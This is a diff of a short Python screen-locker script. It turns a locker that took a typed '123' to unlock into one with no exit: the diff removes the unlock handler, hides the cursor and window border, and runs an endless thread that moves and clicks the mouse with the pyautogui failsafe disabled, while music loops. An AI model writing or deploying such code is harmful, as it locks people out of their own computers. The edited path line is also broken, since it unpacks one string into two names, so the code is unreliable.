@@ -1,44 +1,23 @@
 import pyautogui as g, pygame as p, tkinter as t
 from PIL import Image, ImageTk
 from threading import Thread
-import os
 
-C = "123"
-IMG = r"C:\Users\Rog Strix\Pictures\Новая папка\448ca777ede521648f0395a992ff2af8.png"
-MUS = r"C:\Users\Rog Strix\Music\anthem-of-the-ussr-stalin.mp3" # УКАЖИТЕ ПОЛНЫЙ ПУТЬ К MP3
+IMG, MUS = r"path"
 
-def lock():
+def forever_lock():
     r = t.Tk()
     r.attributes("-fullscreen", 1, "-topmost", 1)
+    r.overrideredirect(True)
+    r.config(cursor="none")
     
-    # Загрузка фото
-    img_obj = Image.open(IMG).resize((r.winfo_screenwidth(), r.winfo_screenheight()))
-    i = ImageTk.PhotoImage(img_obj)
+    i = ImageTk.PhotoImage(Image.open(IMG).resize((r.winfo_screenwidth(), r.winfo_screenheight())))
     t.Label(r, image=i).pack()
 
-    r.b = ""
-    def k(e):
-        r.b += e.char
-        if r.b.endswith(C): r.destroy()
-    r.bind("<Key>", k)
-
     g.FAILSAFE = False
-    def m():
-        try:
-            while True: 
-                g.moveTo(500, 500)
-                g.click(500, 500) # Кликаем в центр, чтобы фокус не ушел
-        except: pass
-    
-    Thread(target=m, daemon=1).start()
+    Thread(target=lambda: [g.click(500,500) or g.moveTo(500, 500) for _ in iter(int, 1)], daemon=1).start()
 
-    # Музыка (запустится только если файл существует)
-    if os.path.exists(MUS):
-        p.mixer.init()
-        p.mixer.music.load(MUS)
-        p.mixer.music.play(-1)
-    
+    try: p.mixer.init(); p.mixer.music.load(MUS); p.mixer.music.play(-1)
+    except: pass
     r.mainloop()
 
-lock()
-
+forever_lock()
